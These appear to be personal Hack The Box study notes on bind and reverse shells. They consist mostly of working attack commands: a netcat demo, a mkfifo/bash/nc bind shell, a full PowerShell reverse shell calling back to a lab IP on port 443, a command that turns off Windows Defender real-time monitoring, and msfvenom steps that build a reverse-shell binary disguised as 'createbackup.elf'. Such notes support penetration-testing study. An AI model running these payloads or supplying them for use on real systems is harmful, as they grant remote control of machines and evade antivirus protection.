# Bind Shells
![[bindshell.webp]]
## connect server and client by netcat.
**1.SERVER  OPEN PORT 7777**
```shell
Target@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
```
**2.CLIENT CONNECT TO SERVER BY PORT 7777**
```shell
015coding@htb[/htb]$ nc -nv 10.129.41.200 7777
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```
**3.SERVER CONFIRM**
```shell
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!  
```
**4.CLIENT MESSAGE "HELLO WORLD"**
```shell
015coding@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
HELLO WORLD  
```
**5.SERVER RECEIVE MESSAGE**
```shell
Target@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
HELLO WORLD  
```
## <mark style="background: #FFB86CA6;">BIND SHELL</mark>
**1.Target**
```shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
 `10.129.41.200` -> Target IP<br>
 **2.ATTACKER**
 ```shell
nc -nv 10.129.41.200 7777
```

# Reverse Shells
![[reverseshell.webp]]
[reverse shell]([Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md))
## reverse shell
**1.Target**
```shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```powershell
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

**2.Attacker**
```shell
sudo nc -lvnp 443
```

# Crafting Shells
use `msfvenom` to craft
```shell
msfvenom -l payloads
```
`-l` -> list payload <br>
and this is how to build
```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
`-p` -> select payload <br>
`-f` -> format file to export<br>
how to find what that request just go to Metasploit ,search and use `options`

